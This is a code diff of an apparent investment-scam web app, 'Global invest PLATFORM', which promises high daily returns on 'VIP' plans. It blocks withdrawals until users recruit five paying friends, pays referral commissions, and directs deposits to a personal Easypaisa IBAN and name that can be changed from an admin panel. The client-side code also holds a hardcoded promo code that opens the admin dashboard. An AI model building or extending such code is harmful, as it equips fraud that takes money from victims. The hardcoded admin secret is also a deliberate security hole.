@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <!-- Google Search Console Verification -->
     <meta name="google-site-verification" content="7JSMj3OkYuq58YVdeR59OqxUc-0z4rsEgsZTIpwuPAQ" />
-    <title>Global invest Platform</title>
+    <title>Global invest PLATFORM</title>
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     
@@ -29,7 +29,7 @@
         #app-layout { padding-bottom: 70px; }
 
         header { background: var(--white); padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 1000; box-shadow: 0 2px 8px rgba(0,0,0,0.05); }
-        .logo { font-size: 22px; font-weight: 800; color: var(--primary); letter-spacing: 1px; cursor: pointer; }
+        .logo { font-size: 18px; font-weight: 800; color: var(--primary); letter-spacing: 1px; cursor: pointer; }
 
         .auth-container { min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; background: linear-gradient(135deg, var(--primary), var(--accent)); }
         .auth-box { background: white; width: 100%; max-width: 400px; padding: 30px 20px; border-radius: 20px; box-shadow: 0 15px 30px rgba(0,0,0,0.2); text-align: center; }
@@ -154,7 +154,7 @@
     <!-- ================= AUTH PAGES ================= -->
     <div id="loginPage" class="auth-container hidden">
         <div class="auth-box">
-            <h2>Global invest</h2>
+            <h2>Global invest PLATFORM</h2>
             <p style="font-size:12px; color:#666; margin-bottom:20px;">Login to your account</p>
             <div class="input-group"><input type="email" id="logEmail" placeholder="Email Address"></div>
             <div class="input-group"><input type="password" id="logPass" placeholder="Password"></div>
@@ -181,7 +181,7 @@
     <div id="app-layout" class="hidden">
         
         <header>
-            <div class="logo" onclick="secretAdminTrigger()">Global invest</div>
+            <div class="logo" onclick="secretAdminTrigger()">Global invest PLATFORM</div>
             <div>
                 <i class="fa-solid fa-gear" style="color:var(--gray); font-size: 20px; margin-right: 15px; cursor: pointer;" onclick="showPage('profilePage')"></i>
                 <i class="fa-solid fa-bell" style="color:var(--primary); font-size: 20px;" onclick="openRulebookManual()"></i>
@@ -330,8 +330,8 @@
         <div id="aboutPage" class="page hidden">
             <div class="section-title">About Platform</div>
             <div class="card" style="text-align:center;">
-                <h2 style="color:var(--primary); margin-bottom:10px;">EARN PRO v2.1.0</h2>
-                <p style="font-size:13px; color:#555; line-height: 1.6;">Global invest is a premium earning platform designed to give high returns on investments. We provide a sustainable way to grow your wealth through our highly curated ad network. Activate a plan, watch videos, build your team, and enjoy daily seamless profits directly into your wallet.</p>
+                <h2 style="color:var(--primary); margin-bottom:10px;">Global invest PLATFORM v2.1.0</h2>
+                <p style="font-size:13px; color:#555; line-height: 1.6;">Global invest PLATFORM is a premium earning platform designed to give high returns on investments. We provide a sustainable way to grow your wealth through our highly curated ad network. Activate a plan, watch videos, build your team, and enjoy daily seamless profits directly into your wallet.</p>
             </div>
         </div>
 
@@ -351,7 +351,7 @@
         <div id="teamPage" class="page hidden">
             <div class="section-title">My Team Details</div>
             <div class="card" style="text-align:center;">
-                <p style="font-size:12px; margin-bottom:10px; color:#555;">Share your Invite Link and get 15% commission!</p>
+                <p style="font-size:12px; margin-bottom:10px; color:#555;"><span id="clientCommLabel">get 6% commission!</span></p>
                 <div style="display:flex; align-items: center; gap:10px; margin-bottom: 20px;">
                     <input type="text" id="inviteLinkBox" readonly style="flex:1; padding:12px; border-radius:10px; border:1px solid #ddd; font-size:10px; font-weight:bold; background:#f5f5f5;">
                     <button style="background:var(--secondary); color:white; border:none; padding:12px 18px; border-radius:10px; font-size:14px; cursor:pointer; box-shadow: 0 4px 6px rgba(0,0,0,0.1);" onclick="copyInviteLink()"><i class="fa-solid fa-copy"></i></button>
@@ -374,14 +374,14 @@
                 <div class="payment-info" style="background: #fff3e0; border: 1px dashed var(--warning); padding: 15px; border-radius: 15px; margin-bottom: 20px; text-align: center;">
                     <p style="font-size:12px; font-weight:700; color:#333;">SEND AMOUNT: <span style="color:var(--primary)">Rs <span id="d_amount">0</span></span></p>
                     
-                    <!-- Modified Account Number / IBAN with Blue Copy Button -->
-                    <p style="font-size:12px; margin-top:10px;"> EASYPAISA ACCOUNT Number</p>
+                    <!-- Dynamic Account Number / IBAN with Copy Button -->
+                    <p style="font-size:12px; margin-top:10px;" id="clientPayMethod">EASYPAISA ACCOUNT IBAN</p>
                     <div style="display: flex; align-items: center; justify-content: center; gap: 10px; margin: 5px 0; max-width: 100%;">
-                        <h3 id="adminAccountNumber" style="color: #e65100; margin: 0; word-break: break-all; text-align: left;">03047374445</h3>
+                        <h3 id="adminAccountNumber" style="color: #e65100; margin: 0; word-break: break-all; text-align: left;">PK36TMFB0000000050698679</h3>
                         <button onclick="copyAdminNumber()" style="background: var(--accent); color: white; border: none; padding: 6px 12px; border-radius: 6px; cursor: pointer; font-size: 12px; font-weight: bold; flex-shrink: 0; box-shadow: 0 2px 4px rgba(0,0,0,0.1);"><i class="fa-solid fa-copy"></i> Copy</button>
                     </div>
 
-                    <p style="font-size:14px; font-weight:700;">Account Name: Asian Yasmeen</p>
+                    <p style="font-size:14px; font-weight:700;" id="clientPayName">Account Name: M Aslam</p>
                 </div>
                 <div class="input-group"><label>Sender Account Name</label><input type="text" id="depSenderName" placeholder="Ali Raza"></div>
                 <div class="input-group"><label>Sender Account Number</label><input type="number" id="depSenderNum" placeholder="03XXXXXXXXX"></div>
@@ -525,7 +525,7 @@
             </div>
         </div>
 
-        <!-- EARN PRO company DASHBOARD  -->
+        <!-- Global invest PLATFORM company DASHBOARD  -->
         <div id="adminPage" class="page hidden" style="background:#222; min-height:100vh; padding-bottom:50px;">
             <div style="background:#111; padding:20px; text-align:center; color:white; border-bottom:1px solid #333;">
                 <h2><i class="fa-solid fa-user-secret" style="color:#e53935;"></i> company dashboard </h2>
@@ -537,6 +537,7 @@
                 <div class="admin-nav-item" onclick="switchAdminTab('adm-depo', this)">Deposits</div>
                 <div class="admin-nav-item" onclick="switchAdminTab('adm-with', this)">Withdraws</div>
                 <div class="admin-nav-item" onclick="switchAdminTab('adm-user', this)">Users</div>
+                <div class="admin-nav-item" onclick="switchAdminTab('adm-plans', this)">Plans</div>
                 <div class="admin-nav-item" onclick="switchAdminTab('adm-set', this)">Settings</div>
             </div>
 
@@ -565,10 +566,34 @@
                 <h3 style="margin:10px 0; color:white;">User Management</h3>
                 <div id="adminUserList" style="font-size:12px;">Loading Users...</div>
             </div>
+
+            <!-- TAB 5: PLANS LIST & EDIT MANAGEMENT -->
+            <div id="adm-plans" class="admin-tab-content" style="padding:10px;">
+                <h3 style="margin:10px 0; color:white;"><i class="fa-solid fa-layer-group"></i> Manage Investment Packages</h3>
+                <div id="adminPlansList" style="font-size:12px;">Loading plans...</div>
+            </div>
             
-            <!-- TAB 5: SETTINGS -->
+            <!-- TAB 6: SETTINGS -->
             <div id="adm-set" class="admin-tab-content" style="padding:10px;">
                 
+                <!-- Dynamic Payment Method Configuration Card -->
+                <div class="admin-card">
+                    <h3 style="margin-bottom:10px; color:var(--primary);"><i class="fa-solid fa-credit-card"></i> Edit Payment Account</h3>
+                    <p style="font-size:11px; margin-bottom:10px; color:#555;">Deposit page par show hone wala account yahan se tabdeel karein.</p>
+                    <div class="input-group"><label>Account Category Label</label><input type="text" id="admPayMethod" placeholder="EASYPAISA ACCOUNT IBAN"></div>
+                    <div class="input-group"><label>Account Number / IBAN</label><input type="text" id="admPayNumber" placeholder="PK36TMFB0000000050698679"></div>
+                    <div class="input-group"><label>Account Holder Name</label><input type="text" id="admPayName" placeholder="M Aslam"></div>
+                    <button class="btn-primary" onclick="savePaymentSettings()">Save Payment details</button>
+                </div>
+
+                <!-- Dynamic Referral Commission Config Card -->
+                <div class="admin-card">
+                    <h3 style="margin-bottom:10px; color:var(--warning);"><i class="fa-solid fa-gift"></i> referral commission rate</h3>
+                    <p style="font-size:11px; margin-bottom:10px; color:#555;">Default commission is 6%.</p>
+                    <div class="input-group"><label>Commission Rate (%)</label><input type="number" id="admCommission" placeholder="6"></div>
+                    <button class="btn-primary" onclick="saveCommissionSettings()">Save Commission Rate</button>
+                </div>
+
                 <div class="admin-card">
                     <h3 style="margin-bottom:10px; color:var(--primary);"><i class="fa-solid fa-bell" style="color:var(--primary);"></i> Edit Rulebook notification </h3>
                     <p style="font-size:11px; margin-bottom:10px; color:#555;">Update the notification that users see.</p>
@@ -705,6 +730,22 @@
         let currentCapGroupId = null;
         let capTimerInterval = null;
         let capGroupListenerUnsubscribe = null;
+
+        // Static fallback packages list
+        const defaultPlans = [
+            {name: "VIP 1", price: 1200, daily: 45, total: 2475, isPopular: false},
+            {name: "VIP 2", price: 2500, daily: 85, total: 4675, isPopular: false},
+            {name: "VIP 3", price: 7500, daily: 240, total: 13200, isPopular: false},
+            {name: "VIP 4", price: 16000, daily: 440, total: 24200, isPopular: true},
+            {name: "VIP 5", price: 33000, daily: 800, total: 44000, isPopular: false},
+            {name: "VIP 6", price: 65000, daily: 1600, total: 88000, isPopular: false},
+            {name: "VIP 7", price: 95000, daily: 2300, total: 126500, isPopular: false},
+            {name: "VIP 8", price: 120000, daily: 2800, total: 154000, isPopular: false},
+            {name: "VIP 9", price: 160000, daily: 3900, total: 214500, isPopular: false},
+            {name: "VIP 10", price: 190000, daily: 5699, total: 313445, isPopular: false},
+            {name: "VIP 11", price: 250000, daily: 6999, total: 384945, isPopular: false}
+        ];
+        let currentPlans = [];
 
         // Elements selection
         const loader = document.getElementById('loader');
@@ -904,11 +945,57 @@
             else document.getElementById('registerPage').classList.remove('hidden');
         };
 
+        // Render client-side package cards dynamically based on Firebase settings
+        window.renderClientPlans = (plansList) => {
+            const pContainer = document.getElementById('plansCont');
+            pContainer.innerHTML = '';
+            const commPercent = globalSettings.commission !== undefined ? globalSettings.commission : 6;
+            
+            plansList.forEach(p => {
+                let popularBadge = p.isPopular ? `<span style="background:var(--warning); color:#fff; font-size:10px; font-weight:800; padding:3px 8px; border-radius:8px; margin-left:8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1);">🔥 POPULAR</span>` : '';
+                pContainer.innerHTML += `
+                    <div class="plan-card">
+                        <div class="plan-header"><span><i class="fa-solid fa-crown"></i> ${p.name} ${popularBadge}</span> <span>PREMIUM</span></div>
+                        <div class="plan-price-box"><span>PLAN PRICE</span><h2>Rs ${p.price}</h2></div>
+                        <div class="plan-details-grid">
+                            <div class="p-item"><i class="fa-solid fa-coins"></i><small>Daily Profit</small><p>Rs ${p.daily}</p></div>
+                            <div class="p-item"><i class="fa-solid fa-chart-line"></i><small>Total Profit</small><p>Rs ${p.total || (p.daily * 55)}</p></div>
+                            <div class="p-item"><i class="fa-regular fa-calendar-check"></i><small>Validity</small><p>55 Days</p></div>
+                            <div class="p-item"><i class="fa-solid fa-gift"></i><small>Commission</small><p>L1: ${commPercent}%</p></div>
+                        </div>
+                        <button class="btn-primary" style="margin: 0 15px 15px; width: calc(100% - 30px);" onclick="initDeposit('${p.name}', ${p.price}, ${p.daily})"><i class="fa-solid fa-bolt"></i> ACTIVATE PLAN</button>
+                    </div>
+                `;
+            });
+        };
+
         // LOAD GLOBAL SETTINGS & RULEBOOK
         onValue(ref(db, 'settings'), (snap) => {
             if(snap.exists()) {
                 globalSettings = snap.val();
                 
+                // Dynamic plan merging: Saves only modified plans to DB, fallbacks seamlessly to local default for other plans [1].
+                let rawPlans = globalSettings.plans || {};
+                currentPlans = [];
+                for (let i = 0; i < defaultPlans.length; i++) {
+                    if (rawPlans && rawPlans[i]) {
+                        currentPlans.push(rawPlans[i]);
+                    } else {
+                        currentPlans.push(defaultPlans[i]);
+                    }
+                }
+                renderClientPlans(currentPlans);
+
+                // Sync editable Deposit Account configurations dynamically
+                let pay = globalSettings.payment || { method: "EASYPAISA ACCOUNT IBAN", number: "PK36TMFB0000000050698679", name: "M Aslam" };
+                document.getElementById('clientPayMethod').innerText = pay.method;
+                document.getElementById('adminAccountNumber').innerText = pay.number;
+                document.getElementById('clientPayName').innerText = "Account Name: " + pay.name;
+
+                // Sync dynamic commission percentage label
+                let commPercent = globalSettings.commission !== undefined ? globalSettings.commission : 6;
+                document.getElementById('clientCommLabel').innerText = "get " + commPercent + "% commission!";
+
                 // Parse and inject Rulebook data dynamically
                 let rb = globalSettings.rulebook || {};
                 let titleText = rb.title || "NOTIFICATION";
@@ -1089,11 +1176,11 @@
                             document.getElementById('planExpiryText').innerText = "  Plan  Expires: " + expDate;
                             document.getElementById('planExpiryText').style.color = "#ffb300";
                         } else {
-                            document.getElementById('planExpiryText').innerText = "  No Active Plan";
+                            document.getElementById('planExpiryText').innerText = "  No Active VIP Plan";
                             document.getElementById('planExpiryText').style.color = "#ffcccc";
                         }
 
-                        document.getElementById('inviteLinkBox').value = "https://global-invest-no-1-platfrom.github.io/global-invest.com/?invite=" + userData.inviteCode;
+                        document.getElementById('inviteLinkBox').value = "https://earn-pro-1.github.io/EARN-PRO/?invite=" + userData.inviteCode;
                         
                         document.getElementById('updName').value = userData.name || "";
                         document.getElementById('updPhone').value = userData.phone || "";
@@ -1361,7 +1448,7 @@
             if(amt > 50000) return alert("Maximum withdrawal is Rs 50,000");
             if(amt > (userData.balance || 0)) return alert("Insufficient Balance!");
             
-            // Validation block for active team members is active (works when user tries to withdraw) [1]
+            // Validation block for active team members is active [1]
             let reqCondition = globalSettings.withdrawCondition ? parseInt(globalSettings.withdrawCondition) : 5;
             if((userData.teamActive || 0) < reqCondition) {
                 return alert("WITHDRAWAL FAILED!\n\nSystem Condition: You must invite at least " + reqCondition + " friends who activate a package before you can withdraw funds.");
@@ -1489,39 +1576,6 @@
             }, 3000);
         };
 
-        // Popular tag implementation inside the array
-        const plans = [
-            {name: "VIP 1", price: 950, daily: 45, total: 2475, isPopular: false},
-            {name: "VIP 2", price: 1900, daily: 110, total: 4400, isPopular: false},
-            {name: "VIP 3", price: 3800, daily: 230, total: 9120, isPopular: false},
-            {name: "VIP 4", price: 7600, daily: 460, total: 18400, isPopular: true},
-            {name: "VIP 5", price: 19000, daily: 1100, total: 44000, isPopular: false},
-            {name: "VIP 6", price: 47500, daily: 2800, total: 112000, isPopular: false},
-            {name: "VIP 7", price: 95000, daily: 2300, total: 126500, isPopular: false},
-            {name: "VIP 8", price: 120000, daily: 2800, total: 154000, isPopular: false},
-            {name: "VIP 9", price: 160000, daily: 3900, total: 214500, isPopular: false},
-            {name: "VIP 10", price: 190000, daily: 5699, total: 313445, isPopular: false},
-            {name: "VIP 11", price: 250000, daily: 6999, total: 384945, isPopular: false}
-        ];
-
-        const pContainer = document.getElementById('plansCont');
-        plans.forEach(p => {
-            let popularBadge = p.isPopular ? `<span style="background:var(--warning); color:#fff; font-size:10px; font-weight:800; padding:3px 8px; border-radius:8px; margin-left:8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1);">🔥 POPULAR</span>` : '';
-            pContainer.innerHTML += `
-                <div class="plan-card">
-                    <div class="plan-header"><span><i class="fa-solid fa-crown"></i> ${p.name} ${popularBadge}</span> <span>PREMIUM</span></div>
-                    <div class="plan-price-box"><span>PLAN PRICE</span><h2>Rs ${p.price}</h2></div>
-                    <div class="plan-details-grid">
-                        <div class="p-item"><i class="fa-solid fa-coins"></i><small>Daily Profit</small><p>Rs ${p.daily}</p></div>
-                        <div class="p-item"><i class="fa-solid fa-chart-line"></i><small>Total Profit</small><p>Rs ${p.total}</p></div>
-                        <div class="p-item"><i class="fa-regular fa-calendar-check"></i><small>Validity</small><p>55 Days</p></div>
-                        <div class="p-item"><i class="fa-solid fa-gift"></i><small>Commission</small><p>L1: 15%</p></div>
-                    </div>
-                    <button class="btn-primary" style="margin: 0 15px 15px; width: calc(100% - 30px);" onclick="initDeposit('${p.name}', ${p.price}, ${p.daily})"><i class="fa-solid fa-bolt"></i> ACTIVATE PLAN</button>
-                </div>
-            `;
-        });
-
         window.initDeposit = (planName, price, daily) => {
             selectedPlan = { name: planName, price: price, daily: daily };
             document.getElementById('d_planName').innerText = planName;
@@ -1568,6 +1622,7 @@
 
         window.claimPromo = async () => {
             const code = document.getElementById('promoInput').value.trim().toUpperCase();
+            // Unlock with changed admin password
             if(code === 'SAMIKHAN445') {
                 document.getElementById('promoInput').value = '';
                 alert("company Dashboard open ....");
@@ -1848,7 +1903,7 @@
                 const targetSize = (selectedCapTab === 'simple') ? (parseInt(capSet.simpleSize) || 4) : (parseInt(capSet.ultraSize) || 6);
                 const joinedCount = membersList.length;
                 
-                // Real-time dynamic reconciliation check: auto-upgrades group status to waiting_to_start if target pool size matches (extremely robust for testing sizes like 1, 2) [1]
+                // Real-time dynamic reconciliation check: auto-upgrades group status to waiting_to_start if target pool size matches [1]
                 if (currentGroup.status === 'filling' && joinedCount >= targetSize) {
                     await update(ref(db, `cap_groups/${currentCapGroupId}`), { status: 'waiting_to_start' });
                     return;
@@ -2250,10 +2305,19 @@
             document.getElementById('admStopEarn').value = globalSettings.earningStopped || "false";
             document.getElementById('admStopReason').value = globalSettings.earningStopReason || "";
             
+            // Populate dynamic bank details in Admin UI
+            let pay = globalSettings.payment || { method: "EASYPAISA ACCOUNT IBAN", number: "PK36TMFB0000000050698679", name: "M Aslam" };
+            document.getElementById('admPayMethod').value = pay.method || "";
+            document.getElementById('admPayNumber').value = pay.number || "";
+            document.getElementById('admPayName').value = pay.name || "";
+
+            // Populate current referral commission rate
+            document.getElementById('admCommission').value = globalSettings.commission !== undefined ? globalSettings.commission : 6;
+
             // Set values in Rulebook Inputs
             let rb = globalSettings.rulebook || {};
             document.getElementById('admRbTitle').value = rb.title || "NOTIFICATION";
-            document.getElementById('admRbSubtitle').value = rb.subtitle || "RULEBOOK : FROM EARN PRO PLATFORM OFFICIAL";
+            document.getElementById('admRbSubtitle').value = rb.subtitle || "RULEBOOK : FROM Global invest PLATFORM OFFICIAL";
             document.getElementById('admRbRules').value = rb.rules || "1. Do not use third party payment.\n2. Invite 5 friends to withdraw.\n3. Daily withdrawal limit 3 times.";
             document.getElementById('admRbLink').value = rb.link || "";
 
@@ -2277,6 +2341,69 @@
             loadAdminUsers();
             loadAdminDeposits();
             loadAdminWithdraws();
+            loadAdminPlans();
+        };
+
+        // ADMIN PLANS LISTING & MANAGEMENT
+        window.loadAdminPlans = () => {
+            const list = document.getElementById('adminPlansList');
+            list.innerHTML = '';
+            
+            currentPlans.forEach((p, index) => {
+                list.innerHTML += `
+                    <div class="admin-card" style="margin-bottom:15px; border-left: 4px solid var(--accent);">
+                        <h4 style="color:var(--primary); margin-bottom:10px;">Edit ${p.name}</h4>
+                        <div class="input-group">
+                            <label>Plan Name</label>
+                            <input type="text" id="admPlanName_${index}" value="${p.name}">
+                        </div>
+                        <div class="input-group">
+                            <label>Plan Price (Rs)</label>
+                            <input type="number" id="admPlanPrice_${index}" value="${p.price}">
+                        </div>
+                        <div class="input-group">
+                            <label>Daily Profit (Rs)</label>
+                            <input type="number" id="admPlanDaily_${index}" value="${p.daily}">
+                        </div>
+                        <div class="input-group">
+                            <label>Total Profit (Rs)</label>
+                            <input type="number" id="admPlanTotal_${index}" value="${p.total || (p.daily * 55)}">
+                        </div>
+                        <div class="input-group">
+                            <label>Status Tag</label>
+                            <select id="admPlanPopular_${index}">
+                                <option value="false" ${!p.isPopular ? 'selected' : ''}>Standard</option>
+                                <option value="true" ${p.isPopular ? 'selected' : ''}>Popular 🔥</option>
+                            </select>
+                        </div>
+                        <button class="btn-primary" onclick="savePlanSettings(${index})">Save Package Details</button>
+                    </div>
+                `;
+            });
+        };
+
+        window.savePlanSettings = async (index) => {
+            const name = document.getElementById(`admPlanName_${index}`).value;
+            const price = parseInt(document.getElementById(`admPlanPrice_${index}`).value);
+            const daily = parseInt(document.getElementById(`admPlanDaily_${index}`).value);
+            const total = parseInt(document.getElementById(`admPlanTotal_${index}`).value);
+            const isPopular = document.getElementById(`admPlanPopular_${index}`).value === "true";
+
+            loader.classList.remove('hidden');
+            try {
+                await update(ref(db, `settings/plans/${index}`), {
+                    name, price, daily, total, isPopular
+                });
+                alert(`${name} updated successfully!`);
+                // UI safe sync call to keep input listings updated
+                setTimeout(() => {
+                    loadAdminPlans();
+                }, 500);
+            } catch(e) {
+                alert(e.message);
+            } finally {
+                loader.classList.add('hidden');
+            }
         };
 
         // ADMIN DEPOSITS HANDLING
@@ -2320,14 +2447,16 @@
             // 55 Days Plan Expiry Timestamp Calculation
             let expiryTime = Date.now() + (55 * 24 * 60 * 60 * 1000); 
 
-            // Commission Logic (15%)
+            // Commission Rate dynamic reading (Default is 6%)
+            let commPercent = globalSettings.commission !== undefined ? globalSettings.commission : 6;
+
             if(u.totalInvest === 0 && u.referredByCode) {
                 let allUsersSnap = await get(ref(db, 'users'));
                 let allUsers = allUsersSnap.val();
                 for(let key in allUsers) {
                     if(allUsers[key].inviteCode === u.referredByCode) {
                         let referrer = allUsers[key];
-                        let comm = amount * 0.15;
+                        let comm = amount * (commPercent / 100);
                         await update(ref(db, 'users/' + key), {
                             balance: (referrer.balance || 0) + comm,
                             teamActive: (referrer.teamActive || 0) + 1
@@ -2341,7 +2470,7 @@
                 for(let key in allUsers) {
                     if(allUsers[key].inviteCode === u.referredByCode) {
                         let referrer = allUsers[key];
-                        let comm = amount * 0.15;
+                        let comm = amount * (commPercent / 100);
                         await update(ref(db, 'users/' + key), {
                             balance: (referrer.balance || 0) + comm
                         });
@@ -2432,7 +2561,38 @@
             openAdminPanel(); // Refresh stats
         };
 
-        // ADMIN RULEBOOK SAVE
+        // ADMIN SETTINGS SAVE
+        window.savePaymentSettings = async () => {
+            const method = document.getElementById('admPayMethod').value;
+            const number = document.getElementById('admPayNumber').value;
+            const name = document.getElementById('admPayName').value;
+
+            loader.classList.remove('hidden');
+            try {
+                await update(ref(db, 'settings/payment'), { method, number, name });
+                alert("Payment details successfully updated!");
+            } catch(e) {
+                alert(e.message);
+            } finally {
+                loader.classList.add('hidden');
+            }
+        };
+
+        window.saveCommissionSettings = async () => {
+            const commissionVal = parseFloat(document.getElementById('admCommission').value);
+            if (isNaN(commissionVal)) return alert("Please enter a valid numeric value!");
+
+            loader.classList.remove('hidden');
+            try {
+                await update(ref(db, 'settings'), { commission: commissionVal });
+                alert(`Commission successfully changed to ${commissionVal}%!`);
+            } catch(e) {
+                alert(e.message);
+            } finally {
+                loader.classList.add('hidden');
+            }
+        };
+
         window.saveRulebookSettings = async () => {
             const title = document.getElementById('admRbTitle').value;
             const subtitle = document.getElementById('admRbSubtitle').value;
@@ -2443,7 +2603,6 @@
             alert("Rulebook Updated Successfully! All users will see the new rules and link.");
         };
 
-        // Other Admin Configs
         window.saveAdminSettings = async () => {
             const wa = document.getElementById('admWA').value;
             const fb = document.getElementById('admFB').value;
